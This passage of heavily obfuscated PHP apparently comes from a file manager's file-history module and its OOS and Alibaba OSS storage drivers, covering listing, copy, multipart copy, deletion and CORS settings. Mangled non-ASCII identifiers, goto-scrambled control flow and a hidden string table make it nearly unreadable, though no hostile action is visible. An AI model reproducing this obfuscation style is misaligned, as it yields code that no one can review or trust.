IO::copy($Bí¥ŒøËŠ«, IO::pathFather($dæ‰š¦Ïí), REPEAT_REPLACE, $CÖˆ´ÀŒ„…[$AˆÈ®öÓµ[38]]); if ($F°ÇÊ½†ç†) { self::remove($dæ‰š¦Ïí, $dæ¥†ğÙ×ƒ); } return $F°ÇÊ½†ç†; } } return !1; } public static function setDetail($aÄ××šŸÊÜ, $döÀÇ‚ˆæù, $bƒ¥³ÕÀí¸) { $Aß—†®ê”Ñ =& $_SERVER[œÕÊİğö]; $A¸ƒ»ÀÜÖ = self::listData($aÄ××šŸÊÜ); if (!$A¸ƒ»ÀÜÖ) { return; } foreach ($A¸ƒ»ÀÜÖ[$Aß—†®ê”Ñ[377]] as $eäÏ¦§õ™ => $bÍ’´á‹­Õ) { if ($bÍ’´á‹­Õ[$Aß—†®ê”Ñ[404]] == $döÀÇ‚ˆæù) { $A¸ƒ»ÀÜÖ[$Aß—†®ê”Ñ[377]][$eäÏ¦§õ™][$Aß—†®ê”Ñ[1151]] = $bƒ¥³ÕÀí¸; self::saveData($A¸ƒ»ÀÜÖ[$Aß—†®ê”Ñ[1153]], $A¸ƒ»ÀÜÖ[$Aß—†®ê”Ñ[377]]); return !0; } } return !1; } public static function fileInfo($c÷ó¾§ëêé, $c­¯½àÏóº) { goto cùà„øÙÆ·; fÂ”¤Ç•Ñ: return IO::info($A°¤ÍâŠ¶Ü); goto c«ÌÈÏÍ; cùà„øÙÆ·: $BÑ‘Š—®°ù =& $_SERVER[œÕÊİğö]; $d±„ƒá™·¦ = self::listData($c÷ó¾§ëêé); if (!$d±„ƒá™·¦) { show_json(LNG($BÑ‘Š—®°ù[115]), !1); } goto b¬Î¹ƒ¹½•; b¬Î¹ƒ¹½•: $A°¤ÍâŠ¶Ü = $BÑ‘Š—®°ù[43]; foreach ($d±„ƒá™·¦[$BÑ‘Š—®°ù[377]] as $A¿“ˆç˜èŠ => $C¦¦¾¸ŒŠƒ) { if ($C¦¦¾¸ŒŠƒ[$BÑ‘Š—®°ù[404]] != $c­¯½àÏóº) { continue; } $A°¤ÍâŠ¶Ü = $d±„ƒá™·¦[$BÑ‘Š—®°ù[1152]] . $C¦¦¾¸ŒŠƒ[$BÑ‘Š—®°ù[38]]; break; } if (!$A°¤ÍâŠ¶Ü) { show_json(LNG($BÑ‘Š—®°ù[115]), !1); } goto fÂ”¤Ç•Ñ; c«ÌÈÏÍ: } public static function fileOut($d×Îñ””ªë, $Fğ´†ìÄ™ø, $f¦åÜ§À©˜ = false) { $EŞ¤–²âÉ„ =& $_SERVER[œÕÊİğö]; $a¶ƒÏ Îè = self::fileInfo($d×Îñ””ªë, $Fğ´†ìÄ™ø); $C¦…ã©ìªõ =& $GLOBALS[$EŞ¤–²âÉ„[7]]; $f¦åÜ§À©˜ = isset($C¦…ã©ìªõ[$EŞ¤–²âÉ„[1116]]) && $C¦…ã©ìªõ[$EŞ¤–²âÉ„[1116]] == 1; if (isset($C¦…ã©ìªõ[$EŞ¤–²âÉ„[39]]) && $C¦…ã©ìªõ[$EŞ¤–²âÉ„[39]] == $EŞ¤–²âÉ„[1154]) { return IO::fileOutImage($a¶ƒÏ Îè[$EŞ¤–²âÉ„[86]], $C¦…ã©ìªõ[$EŞ¤–²âÉ„[1155]]); } IO::fileOut($a¶ƒÏ Îè[$EŞ¤–²âÉ„[86]], $f¦åÜ§À©˜, get_path_this($d×Îñ””ªë)); } public static function listData($Bªòëíøí, $aèà’š¶èí = true) { goto BÊ…„‹ì•ô; f¯…Ü‡ÓêÜ: $fí²ò»‰½í = IO::getContent($b˜Ç…”È¨[$eÅØÒë»Ø“[1153]]); if ($fí²ò»‰½í) { $d‰¨à¼¶İ = json_decode($fí²ò»‰½í, !0); if (is_array($d‰¨à¼¶İ)) { $b˜Ç…”È¨[$eÅØÒë»Ø“[377]] = $d‰¨à¼¶İ; } } return $b˜Ç…”È¨; goto E‹Êæ„ò‡Ğ; BÊ…„‹ì•ô: $eÅØÒë»Ø“ =& $_SERVER[œÕÊİğö]; if ($aèà’š¶èí && !IO::exist($Bªòëíøí)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto e°Òğ…ÓÜ; e°Òğ…ÓÜ: if (substr($Bªòëíøí, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $cˆ”¿Šà—É = self::pathHistory($Bªòëíøí); $b˜Ç…”È¨ = array($eÅØÒë»Ø“[1153] => $cˆ”¿Šà—É . $eÅØÒë»Ø“[1140], $eÅØÒë»Ø“[1152] => rtrim(get_path_father($cˆ”¿Šà—É), $eÅØÒë»Ø“[8]) . $eÅØÒë»Ø“[8], $eÅØÒë»Ø“[377] => array()); goto f¯…Ü‡ÓêÜ; E‹Êæ„ò‡Ğ: } private static function saveData($cãˆ¬â›ÁÄ, $AçÛÎãØÈ) { goto a»¹†§¿ÒĞ; EÆàÇöÆİ‚: return !0; goto FïîÌÁ§›®; aö®›´‘µ: $d«Ï‰½ = IO::pathFather($cãˆ¬â›ÁÄ); IO::remove($cãˆ¬â›ÁÄ); self::clearEmptyFolder($d«Ï‰½); goto EÆàÇöÆİ‚; a»¹†§¿ÒĞ: $e•éº†¹ùà =& $_SERVER[œÕÊİğö]; self::log($e•éº†¹ùà[1156] . $cãˆ¬â›ÁÄ . $e•éº†¹ùà[78] . count($AçÛÎãØÈ), $e•éº†¹ùà[742]); if ($AçÛÎãØÈ) { return IO::setContent($cãˆ¬â›ÁÄ, json_encode($AçÛÎãØÈ)); } goto aö®›´‘µ; FïîÌÁ§›®: } public static function clearEmptyFolder($FöÉó¶­¯ƒ) { goto e¥ƒºÜˆ‡¹; Då¡·ÒÉÏ: $AÈĞ¸â¡Å˜ = IO::has($FöÉó¶­¯ƒ, !0); if ($AÈĞ¸â¡Å˜[$dÈŒÉÒƒ[213]] > 0 || $AÈĞ¸â¡Å˜[$dÈŒÉÒƒ[214]] > 0) { return; } IO::remove($FöÉó¶­¯ƒ); goto f¿ªŸÈÛˆ; e¥ƒºÜˆ‡¹: $dÈŒÉÒƒ =& $_SERVER[œÕÊİğö]; if (trim($FöÉó¶­¯ƒ, $dÈŒÉÒƒ[8]) == trim(self::$_historyBase, $dÈŒÉÒƒ[8])) { return; } $f‹˜¼ áô¸ = IO::pathFather($FöÉó¶­¯ƒ); goto Då¡·ÒÉÏ; f¿ªŸÈÛˆ: self::clearEmptyFolder($f‹˜¼ áô¸); goto Bœ¬ŒÔ¦ºŸ; Bœ¬ŒÔ¦ºŸ: } private static function getBasePath() { goto fÎÕÜ§ÀÜ; F¹‰¼Ï´èò: file_put_contents($cÕ£Ì¾«£Æ . $Cò¦î¸é´î[1160], $Cò¦î¸é´î[43]); file_put_contents(DATA_PATH . $Cò¦î¸é´î[1160], $Cò¦î¸é´î[43]); Model($Cò¦î¸é´î[1157])->set($Cò¦î¸é´î[1158], $cÕ£Ì¾«£Æ); goto cÆ¨ŠßÎÔÙ; cÆ¨ŠßÎÔÙ: return $cÕ£Ì¾«£Æ; goto F®¶Ï¥İÙÊ; A¨¥·»‹”Ş: $cÕ£Ì¾«£Æ = DATA_PATH . $Cò¦î¸é´î[1159] . rand_string(8) . $Cò¦î¸é´î[8]; $cÕ£Ì¾«£Æ = IO::mkdir($cÕ£Ì¾«£Æ); $cÕ£Ì¾«£Æ = rtrim($cÕ£Ì¾«£Æ, $Cò¦î¸é´î[8]) . $Cò¦î¸é´î[8]; goto F¹‰¼Ï´èò; fÎÕÜ§ÀÜ: $Cò¦î¸é´î =& $_SERVER[œÕÊİğö]; $cÕ£Ì¾«£Æ = Model($Cò¦î¸é´î[1157])->get($Cò¦î¸é´î[1158]); if ($cÕ£Ì¾«£Æ) { if (!IO::exist($cÕ£Ì¾«£Æ)) { IO::mkdir($cÕ£Ì¾«£Æ); } if (get_path_this($cÕ£Ì¾«£Æ) == $Cò¦î¸é´î[1143]) { $AÖë®èŞ¨© = $Cò¦î¸é´î[1159] . rand_string(8); @rename($cÕ£Ì¾«£Æ, get_path_father($cÕ£Ì¾«£Æ) . $Cò¦î¸é´î[8] . $AÖë®èŞ¨©); $cÕ£Ì¾«£Æ = DATA_PATH . $AÖë®èŞ¨© . $Cò¦î¸é´î[8]; file_put_contents(DATA_PATH . $Cò¦î¸é´î[1160], $Cò¦î¸é´î[43]); Model($Cò¦î¸é´î[1157])->set($Cò¦î¸é´î[1158], $cÕ£Ì¾«£Æ); } return $cÕ£Ì¾«£Æ; } goto A¨¥·»‹”Ş; F®¶Ï¥İÙÊ: } } goto e±â¡½Ë‘À; fØˆƒÉŠ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($fˆ×õ“Ï±») { parent::__construct($fˆ×õ“Ï±»); $this->signatureVersion($_SERVER[œÕÊİğö][222]); } public function fileOutLink($F¬¯ïäÌ¡î) { $dâ¿©å…Ì =& $_SERVER[œÕÊİğö]; if (substr($F¬¯ïäÌ¡î, 0, 7) == $dâ¿©å…Ì[1226]) { $F¬¯ïäÌ¡î = $dâ¿©å…Ì[1227] . substr($F¬¯ïäÌ¡î, 7); } header($dâ¿©å…Ì[169] . $F¬¯ïäÌ¡î); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($Cø”‰ÁË) { parent::__construct(); include_once SDK_DIR . $_SERVER[œÕÊİğö][1282]; $this->_init($Cø”‰ÁË); } public function _init($bÅêËª–•Ú) { $fãÛ‹Ò·Ï =& $_SERVER[œÕÊİğö]; foreach ($bÅêËª–•Ú as $e“ƒ¿œ”Ù => $Cäëâ†©ë™) { if (isset($this->{$e“ƒ¿œ”Ù})) { $this->{$e“ƒ¿œ”Ù} = $Cäëâ†©ë™; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($fãÛ‹Ò·Ï[1283] . LNG($fãÛ‹Ò·Ï[1284])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto BËÑ²½Ï; F¬¹†´è’Ù: $e·›š˜äŸí->addRule($DÑ—ó•Õ‚); try { $this->client->putBucketCors($this->bucket, $e·›š˜äŸí); } catch (OSS\Core\OssException $dÍ¢‘²ÜÍñ) { return !1; } return !0; goto fèôŠÓÍƒö; c¾ª«ğ¶¼®: $DÑ—ó•Õ‚->addAllowedMethod($e·Ñ•â‹ˆ·[1288]); $DÑ—ó•Õ‚->addAllowedMethod($e·Ñ•â‹ˆ·[1289]); $DÑ—ó•Õ‚->addAllowedMethod($e·Ñ•â‹ˆ·[168]); goto Döß…Ğ†ø; F¯Ü¼·¢Ú: $DÑ—ó•Õ‚->addAllowedOrigin($e·Ñ•â‹ˆ·[1285]); $DÑ—ó•Õ‚->addAllowedMethod($e·Ñ•â‹ˆ·[1286]); $DÑ—ó•Õ‚->addAllowedMethod($e·Ñ•â‹ˆ·[1287]); goto c¾ª«ğ¶¼®; BËÑ²½Ï: $e·Ñ•â‹ˆ· =& $_SERVER[œÕÊİğö]; $e·›š˜äŸí = new OSS\Model\CorsConfig(); $DÑ—ó•Õ‚ = new OSS\Model\CorsRule(); goto F¯Ü¼·¢Ú; Döß…Ğ†ø: $DÑ—ó•Õ‚->setMaxAgeSeconds(600); $DÑ—ó•Õ‚->addExposeHeader($e·Ñ•â‹ˆ·[1290]); $DÑ—ó•Õ‚->addAllowedHeader($e·Ñ•â‹ˆ·[1285]); goto F¬¹†´è’Ù; fèôŠÓÍƒö: } public function getBucketCors() { goto CİƒÊ¢ô–˜; F†Áã§àÜ¿: if (!$b­‡Ò®Ùš || !($DÄÏ¡Ò¡„¾ = $b­‡Ò®Ùš->getRules())) { return null; } $b÷ñ˜×‘â = $DÄÏ¡Ò¡„¾[0]->getAllowedOrigins(); $AˆÎ»õÅÕˆ = $DÄÏ¡Ò¡„¾[0]->getAllowedMethods(); goto DÑÕéóÈË; CİƒÊ¢ô–˜: $bÇç»‘àÅ =& $_SERVER[œÕÊİğö]; $b­‡Ò®Ùš = null; try { $b­‡Ò®Ùš = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $bŒĞŒ¡öÓ) { return null; } goto F†Áã§àÜ¿; aôÖ±Éîëô: return array($bÇç»‘àÅ[191] => isset($b÷ñ˜×‘â[0]) ? $b÷ñ˜×‘â[0] : $bÇç»‘àÅ[43], $bÇç»‘àÅ[195] => $AˆÎ»õÅÕˆ, $bÇç»‘àÅ[1291] => $E÷ÄÚìÜÈ÷, $bÇç»‘àÅ[1292] => isset($d’»»Ø›È®[0]) ? $d’»»Ø›È®[0] : $bÇç»‘àÅ[43], $bÇç»‘àÅ[193] => isset($d¾î•šÚø…[0]) ? $d¾î•šÚø…[0] : $bÇç»‘àÅ[43]); goto fªåÏ¶ïê§; DÑÕéóÈË: $E÷ÄÚìÜÈ÷ = $DÄÏ¡Ò¡„¾[0]->getMaxAgeSeconds(); $d’»»Ø›È® = $DÄÏ¡Ò¡„¾[0]->getExposeHeaders(); $d¾î•šÚø… = $DÄÏ¡Ò¡„¾[0]->getAllowedHeaders(); goto aôÖ±Éîëô; fªåÏ¶ïê§: } public function isBucketCors() { goto CÇå×¦ÙÔ¼; e¢±àéë¹: if ($Fâ¶Û³Î¬·[$B¾‚Šô…²×[191]] != $B¾‚Šô…²×[192] || $Fâ¶Û³Î¬·[$B¾‚Šô…²×[193]] != $B¾‚Šô…²×[192]) { return !1; } $FÏ”³Ï³„“ = array_map($B¾‚Šô…²×[194], $Fâ¶Û³Î¬·[$B¾‚Šô…²×[195]]); if (!is_array($FÏ”³Ï³„“)) { $FÏ”³Ï³„“ = array(); } goto bÌôÏ¿Õ¶¾; CÇå×¦ÙÔ¼: $B¾‚Šô…²× =& $_SERVER[œÕÊİğö]; $Fâ¶Û³Î¬· = $this->getBucketCors(); if (!$Fâ¶Û³Î¬· || !is_array($Fâ¶Û³Î¬·)) { return !1; } goto e¢±àéë¹; bÌôÏ¿Õ¶¾: $d†Š…™²Ğ = array($B¾‚Šô…²×[196], $B¾‚Šô…²×[197], $B¾‚Šô…²×[198], $B¾‚Šô…²×[199], $B¾‚Šô…²×[200]); $dò¬ïâ°ª¢ = array_diff($d†Š…™²Ğ, $FÏ”³Ï³„“); return empty($dò¬ïâ°ª¢); goto A‰°İ¼ğè; A‰°İ¼ğè: } public function mkfile($FÒªñ»ñ•, $FáØø¹Ä«» = '', $bƒâÆªç•ó = REPEAT_RENAME) { $eé™ñá…›· = $this->setContent($FÒªñ»ñ•, $FáØø¹Ä«»); if ($eé™ñá…›· !== !1) { return $this->getPathOuter($FÒªñ»ñ•); } return !1; } public function mkdir($A”®æ¨Ø´·, $eº­Ğóİ¬º = REPEAT_SKIP) { if ($this->_isFolder($A”®æ¨Ø´·)) { return $this->getPathOuter($A”®æ¨Ø´·); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($A”®æ¨Ø´·)); } catch (OSS\Core\OssException $fè§ÑñšÊ) { return !1; } return $this->getPathOuter($A”®æ¨Ø´·); } private function fileList($c˜¿‡Œì„¹, $C«ßÃŒº—  = '', $E»Å¤ÕÃ = 0) { goto Câ‡ã¬“ìÖ; DØç‹Í’çØ: $F¡‡ù„­ù× = $C¡ò“´àº¥ = array(); while (!0) { check_abort(); $Eğ˜»Ã¹½Œ = array($e·âœÅ—É¼[1293] => $C«ßÃŒº— , $e·âœÅ—É¼[1294] => $d ªÂ‹³Ò, $e·âœÅ—É¼[1295] => $C«Ñöø¬•Ì, $e·âœÅ—É¼[1296] => $CÑ´°‹†Êæ); try { $Cí°Û¾Ã = $this->client->listObjects($this->bucket, $Eğ˜»Ã¹½Œ); } catch (OSS\Core\OssException $b¡ÎëÕÑ×›) { break; } $CÑ´°‹†Êæ = $Cí°Û¾Ã->getNextMarker(); $bè ªÛÜôÎ = $Cí°Û¾Ã->getObjectList(); $Cİ§°ª›ãØ = $Cí°Û¾Ã->getPrefixList(); foreach ($bè ªÛÜôÎ as $A¢÷”³Î‹Š) { goto f¥ò»Ø¬‰š; e¯—²µé´: $a‡é§Ïãß = $A¢÷”³Î‹Š->getLastModified(); $c¢†¶¡£º³ = $E»Å¤ÕÃ ? array($e·âœÅ—É¼[38] => $AïĞäÜÃ¦„, $e·âœÅ—É¼[88] => $eµÇáÔ¥Ñ, $e·âœÅ—É¼[207] => strtotime($a‡é§Ïãß)) : $AïĞäÜÃ¦„; $EÂßŠ‚çÛä = $eµÇáÔ¥Ñ == 0 && substr($AïĞäÜÃ¦„, strlen($AïĞäÜÃ¦„) - 1, 1) == $e·âœÅ—É¼[8] ? !0 : !1; goto d‰„¤ïÅëõ; d‰„¤ïÅëõ: if ($D¾ßèÖ‹‚¬) { $this->cacheMethod($e·âœÅ—É¼[209], $AïĞäÜÃ¦„, $EÂßŠ‚çÛä); $this->cacheMethod($e·âœÅ—É¼[210], $AïĞäÜÃ¦„, array($e·âœÅ—É¼[88] => $eµÇáÔ¥Ñ, $e·âœÅ—É¼[1297] => $eµÇáÔ¥Ñ, $e·âœÅ—É¼[94] => strtotime($a‡é§Ïãß), $e·âœÅ—É¼[1298] => $a‡é§Ïãß)); } if ($EÂßŠ‚çÛä) { $F¡‡ù„­ù×[] = $AïĞäÜÃ¦„; continue; } $C¡ò“´àº¥[] = $c¢†¶¡£º³; goto c¦ÇÛ·×Õ”; f¥ò»Ø¬‰š: if ($A¢÷”³Î‹Š->getKey() == $d ªÂ‹³Ò) { continue; } $AïĞäÜÃ¦„ = $A¢÷”³Î‹Š->getKey(); $eµÇáÔ¥Ñ = $A¢÷”³Î‹Š->getSize(); goto e¯—²µé´; c¦ÇÛ·×Õ”: } foreach ($Cİ§°ª›ãØ as $fÕÇÌë–±®) { $F¡‡ù„­ù×[] = $fÕÇÌë–±®->getPrefix(); if ($D¾ßèÖ‹‚¬) { $this->cacheMethod($e·âœÅ—É¼[209], $AïĞäÜÃ¦„, !0); } } if ($CÑ´°‹†Êæ === $e·âœÅ—É¼[43]) { break; } } if ($D¾ßèÖ‹‚¬) { $this->cacheMethod($e·âœÅ—É¼[209], $c˜¿‡Œì„¹, !0); } goto BÂõ†ÀŸË‹; Câ‡ã¬“ìÖ: $e·âœÅ—É¼ =& $_SERVER[œÕÊİğö]; $c˜¿‡Œì„¹ = trim($c˜¿‡Œì„¹, $e·âœÅ—É¼[8]); $d ªÂ‹³Ò = empty($c˜¿‡Œì„¹) && $c˜¿‡Œì„¹ !== $e·âœÅ—É¼[201] ? $e·âœÅ—É¼[43] : $c˜¿‡Œì„¹ . $e·âœÅ—É¼[8]; goto cÌ˜Ö…‰×õ; cÌ˜Ö…‰×õ: $CÑ´°‹†Êæ = $e·âœÅ—É¼[43]; $C«Ñöø¬•Ì = 1000; $D¾ßèÖ‹‚¬ = $this->listItemCache === !1 ? !1 : !0; goto DØç‹Í’çØ; BÂõ†ÀŸË‹: return array($e·âœÅ—É¼[85] => $F¡‡ù„­ù×, $e·âœÅ—É¼[84] => $C¡ò“´àº¥); goto Cµ„ğ±¯¢ê; Cµ„ğ±¯¢ê: } public function copyFile($DÀåÏ¸´¯ğ, $B÷¦ö‘¹Õ) { $bè•Øğ£Õ = $this->size($DÀåÏ¸´¯ğ); if ($bè•Øğ£Õ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $DÀåÏ¸´¯ğ, $this->bucket, $this->pathEncode($B÷¦ö‘¹Õ)); } catch (OSS\Core\OssException $eíîîÀíò‰) { return !1; } return $this->getPathOuter($B÷¦ö‘¹Õ); } $a©Ë×Àï´ = $this->multiCopyObject($DÀåÏ¸´¯ğ, $B÷¦ö‘¹Õ, $bè•Øğ£Õ); return $a©Ë×Àï´ ? $this->getPathOuter($B÷¦ö‘¹Õ) : !1; } private function multiCopyObject($cëÈ÷¼ëœ, $F¼ÆÁİƒƒñ, $aî²”­‘¬Í) { $D½…ç–Æäô =& $_SERVER[œÕÊİğö]; try { goto fÎÔÂÛĞ˜ƒ; e›óä‹Û: $b´‹¡—îè« = array(); foreach ($F¶“Ë¦ÄÈè as $dÚñ‚Â => $A©ò›ÒåŸ ) { $b´‹¡—îè«[] = array($D½…ç–Æäô[1303] => $dÚñ‚Â + 1, $D½…ç–Æäô[1304] => $A©ò›ÒåŸ ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($F¼ÆÁİƒƒñ), $F‹™Ôøƒ’, $b´‹¡—îè«); goto Cáæœ‹«¶ä; Aˆ¶ŠÂ¿•¾: $D¾Ìº‡óé = 1; $Cğ‹”³ã”Õ = 0; $F¶“Ë¦ÄÈè = array(); goto CÙÇ–¡˜˜; fÎÔÂÛĞ˜ƒ: $CÔ‰Ù¤ğÖ… = array(); if ($A„«ßÏ…÷£ = $this->hashMd5($cëÈ÷¼ëœ)) { $CÔ‰Ù¤ğÖ… = array(OSS\OssClient::OSS_HEADERS => array($D½…ç–Æäô[1299] => $A„«ßÏ…÷£)); } $F‹™Ôøƒ’ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($F¼ÆÁİƒƒñ), $CÔ‰Ù¤ğÖ…); goto Aˆ¶ŠÂ¿•¾; CÙÇ–¡˜˜: $c«•¢ïÓÑÈ = 1024 * 1024 * 10; $Fºš¹ÕŠîâ = $this->client->generateMultiuploadParts($aî²”­‘¬Í, $c«•¢ïÓÑÈ); foreach ($Fºš¹ÕŠîâ as $dÚñ‚Â => $eğÃ§£•Û¬) { $eÂêªŠñå× = $Cğ‹”³ã”Õ + (int) $eğÃ§£•Û¬[$D½…ç–Æäô[1300]]; $EƒÏ’„£¹ = (int) $eğÃ§£•Û¬[$D½…ç–Æäô[345]] + $eÂêªŠñå× - 1; $còô¨È£¶À = array($D½…ç–Æäô[1301] => $eÂêªŠñå×, $D½…ç–Æäô[1302] => $EƒÏ’„£¹); $F¶“Ë¦ÄÈè[] = $this->client->uploadPartCopy($this->bucket, $cëÈ÷¼ëœ, $this->bucket, $this->pathEncode($F¼ÆÁİƒƒñ), $D¾Ìº‡óé, $F‹™Ôøƒ’, $còô¨È£¶À); $D¾Ìº‡óé = $D¾Ìº‡óé + 1; } goto e›óä‹Û; Cáæœ‹«¶ä: } catch (OSS\Core\OssException $a‘àåÏ¸²Ë) { return !1; } return !0; } public function moveFile($a¦á•‡ë×Ö, $BÄÅ¨¤«Ú½) { if ($this->copyFile($a¦á•‡ë×Ö, $BÄÅ¨¤«Ú½)) { $this->remove($a¦á•‡ë×Ö); return $this->getPathOuter($BÄÅ¨¤«Ú½); } return !1; } public function delFile($CÆŠ÷¢¹åÍ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($CÆŠ÷¢¹åÍ)); } catch (OSS\Core\OssException $CæÇª±¹Ü) { return !1; } return !0; } public function delFolder($F·Ÿ¼»‡¼) { goto fÌÕÙ°í‚ì; Eš±º¥æã: $fƒÁ¶¢‘’¹ = $this->fileList($F·Ÿ¼»‡¼); $this->listItemCache = !0; $dÜ¬Úê…£° = trim($F·Ÿ¼»‡¼, $e÷Ï¹Ú¢öñ[8]) . $e÷Ï¹Ú¢öñ[8]; goto CõÃ‡ß‚”ß; D‚¼¿»æ: $B¬îÚÜ“öá = $this->delByBatch($fƒÁ¶¢‘’¹[$e÷Ï¹Ú¢öñ[85]]); if (!$B¬îÚÜ“öá) { return !1; } return $this->delFile($dÜ¬Úê…£°); goto E—ŒŠ†Ù¿; CõÃ‡ß‚”ß: if (!empty($F·Ÿ¼»‡¼) && $F·Ÿ¼»‡¼ !== $e÷Ï¹Ú¢öñ[201] && !in_array($dÜ¬Úê…£°, $fƒÁ¶¢‘’¹[$e÷Ï¹Ú¢öñ[85]])) { $fƒÁ¶¢‘’¹[$e÷Ï¹Ú¢öñ[85]][] = $dÜ¬Úê…£°; } $B¬îÚÜ“öá = $this->delByBatch($fƒÁ¶¢‘’¹[$e÷Ï¹Ú¢öñ[84]]); if (!$B¬îÚÜ“öá) { return !1; } goto D‚¼¿»æ; fÌÕÙ°í‚ì: $e÷Ï¹Ú¢öñ =& $_SERVER[œÕÊİğö]; if (!$this->exist($F·Ÿ¼»‡¼)) { return !0; } $this->listItemCache = !1; goto Eš±º¥æã; E—ŒŠ†Ù¿: } private function delByBatch($F„ÊÌÑÆøé) { foreach (array_chunk($F„ÊÌÑÆøé, 1000) as $BÊÜïÜëÁ) { try { $this->client->deleteObjects($this->bucket, $BÊÜïÜëÁ); } catch (OSS\Core\OssException $dÁ¤æì”Åê) { return !1; } } return !0; } public function rename($C±ºÛ“Î¸š, $C‘´†‘‹ë) { return $this->renameObject($C±ºÛ“Î¸š, $C‘´†‘‹ë); } private function fileInfo($D»ë·Ğˆß¥, $E´ÉŞ£ê² = false, $C÷‘‘›Ûâª = array()) { goto A¸çñØÓğ‡; DÈ‰±óÃ: return $dÚ¬¯„£ƒ¿; goto dšíÒÔ‡Ñ°; A¸çñØÓğ‡: $B¾¬Û‡Ù‡µ =& $_SERVER[œÕÊİğö]; $dÚ¬¯„£ƒ¿ = array($B¾¬Û‡Ù‡µ[38] => $this->pathThis($D»ë·Ğˆß¥), $B¾¬Û‡Ù‡µ[86] => $this->getPathOuter($D»ë·Ğˆß¥), $B¾¬Û‡Ù‡µ[39] => $B¾¬Û‡Ù‡µ[203], $B¾¬Û‡Ù‡µ[88] => isset($C÷‘‘›Ûâª[$B¾¬Û‡Ù‡µ[88]]) ? $C÷‘‘›Ûâª[$B¾¬Û‡Ù‡µ[88]] : 0, $B¾¬Û‡Ù‡µ[178] => $this->ext($D»ë·Ğˆß¥)); if ($E´ÉŞ£ê²) { return $dÚ¬¯„£ƒ¿; } goto F®¹ÌÆïŞÂ; d¤’’Œ™†ò: if (isset($C÷‘‘›Ûâª[$B¾¬Û‡Ù‡µ[88]])) { $dÚ¬¯„£ƒ¿[$B¾¬Û‡Ù‡µ[88]] = $C÷‘‘›Ûâª[$B¾¬Û‡Ù‡µ[88]]; } if (isset($C÷‘‘›Ûâª[$B¾¬Û‡Ù‡µ[94]])) { $dÚ¬¯„£ƒ¿[$B¾¬Û‡Ù‡µ[94]] = $C÷‘‘›Ûâª[$B¾¬Û‡Ù‡µ[94]]; } if (isset($C÷‘‘›Ûâª[$B¾¬Û‡Ù‡µ[207]]) && !trim($dÚ¬¯„£ƒ¿[$B¾¬Û‡Ù‡µ[94]])) { $dÚ¬¯„£ƒ¿[$B¾¬Û‡Ù‡µ[94]] = $C÷‘‘›Ûâª[$B¾¬Û‡Ù‡µ[207]]; } goto DÈ‰±óÃ; F®¹ÌÆïŞÂ: $dÚ¬¯„£ƒ¿[$B¾¬Û‡Ù‡µ[204]] = $dÚ¬¯„£ƒ¿[$B¾¬Û‡Ù‡µ[94]] = 0; $dÚ¬¯„£ƒ¿[$B¾¬Û‡Ù‡µ[205]] = $dÚ¬¯„£ƒ¿[$B¾¬Û‡Ù‡µ[206]] = !0; if (empty($C÷‘‘›Ûâª)) { $bÊ Ö©º×ì = $this->objectMeta($D»ë·Ğˆß¥); if (!$bÊ Ö©º×ì) { return $dÚ¬¯„£ƒ¿; } $C÷‘‘›Ûâª = array($B¾¬Û‡Ù‡µ[94] => strtotime($bÊ Ö©º×ì[$B¾¬Û‡Ù‡µ[1298]]), $B¾¬Û‡Ù‡µ[88] => $bÊ Ö©º×ì[$B¾¬Û‡Ù‡µ[1297]] + 0); } goto d¤’’Œ™†ò; dšíÒÔ‡Ñ°: } private function folderInfo($e³Ùùß¥ç, $aâòåÏÑÊô = false, $b£º³ÇÌÀ° = array()) { goto aé¼ËÜÓÚÉ; aé¼ËÜÓÚÉ: $a™Ùñé°¾ =& $_SERVER[œÕÊİğö]; $E¼®ã²½™ = array($a™Ùñé°¾[38] => $this->pathThis($e³Ùùß¥ç), $a™Ùñé°¾[86] => $this->getPathOuter($a™Ùñé°¾[8] . $e³Ùùß¥ç), $a™Ùñé°¾[39] => $a™Ùñé°¾[87]); if ($aâòåÏÑÊô) { return $E¼®ã²½™; } goto e³«Çãñ¹; e©¢²¹Çô: if (isset($b£º³ÇÌÀ°[$a™Ùñé°¾[94]])) { $E¼®ã²½™[$a™Ùñé°¾[94]] = $b£º³ÇÌÀ°[$a™Ùñé°¾[94]]; } if (isset($b£º³ÇÌÀ°[$a™Ùñé°¾[204]])) { $E¼®ã²½™[$a™Ùñé°¾[204]] = $b£º³ÇÌÀ°[$a™Ùñé°¾[204]]; } return $E¼®ã²½™; goto f¯–µÆë…à; e³«Çãñ¹: $E¼®ã²½™[$a™Ùñé°¾[204]] = $E¼®ã²½™[$a™Ùñé°¾[94]] = 0; $E¼®ã²½™[$a™Ùñé°¾[205]] = $E¼®ã²½™[$a™Ùñé°¾[206]] = !0; if (empty($b£º³ÇÌÀ°)) { $e³Ùùß¥ç = rtrim($e³Ùùß¥ç, $a™Ùñé°¾[8]) . $a™Ùñé°¾[8]; $CšœÆ„‡³Ú = $this->objectMeta($e³Ùùß¥ç); if (!$CšœÆ„‡³Ú) { return $E¼®ã²½™; } $b£º³ÇÌÀ° = array($a™Ùñé°¾[204] => $CšœÆ„‡³Ú[$a™Ùñé°¾[514]][$a™Ùñé°¾[1305]], $a™Ùñé°¾[94] => strtotime($CšœÆ„‡³Ú[$a™Ùñé°¾[1298]])); } goto e©¢²¹Çô; f¯–µÆë…à: } public function listPath($dâ®‰Êà²Â, $eÂƒĞÃµ = false) { $d—øä¶ÇÜ =& $_SERVER[œÕÊİğö]; $Aé¦Ì¡º©· = $this->fileList($dâ®‰Êà²Â, $d—øä¶ÇÜ[8], !0); foreach ($Aé¦Ì¡º©·[$d—øä¶ÇÜ[85]] as $bÊ¸£²ùØò => $eß¡šá„ª) { 